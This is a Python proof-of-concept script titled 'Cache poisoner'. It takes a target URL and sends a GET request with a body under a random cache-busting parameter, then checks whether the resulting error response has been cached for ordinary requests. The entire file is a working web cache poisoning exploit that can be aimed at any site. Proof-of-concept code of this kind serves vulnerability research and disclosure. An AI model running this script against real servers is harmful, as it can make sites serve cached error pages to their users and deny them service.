#!/usr/bin/env python3
"""PoC cache poisoning"""

import sys
import random
import argparse

import requests

def main() -> None:
    """Entry point"""
    parser = argparse.ArgumentParser(description="Cache poisoner")
    parser.add_argument("url", help="the URL to poison")
    args = parser.parse_args()

    url = args.url
    if not url.startswith("http"):
        url = "https://" + url
    params = {"cb": random.randbytes(4).hex()}
    body = "yolo"

    print(f"Poisoning {url} using parameter cb =", params["cb"])

    # Baseline good request with different parameters.
    response = requests.get(url=url, params={"cb": random.randbytes(4).hex()})
    response.raise_for_status()
    good_status_code = response.status_code

    # Send a GET with any request body.
    # Parameters are used for cache busting only.
    # This should return a bad code, which is fine.
    response = requests.get(url=url, params=params, data=body)
    assert response.request.body == body
    if response.status_code == good_status_code:
        print("Server handled GET with body; exiting")
        sys.exit(1)
    bad_status_code = response.status_code

    # Make a standard request with no body on the same cached path.
    # This should return the same bad response, cached.
    response = requests.get(url=url, params=params)
    if response.status_code != bad_status_code:
        print("Response wasn't cached")
        sys.exit(2)

    print("Cache poisoned")
    print(response.status_code)
    print(response.text)

if __name__ == "__main__":
    main()
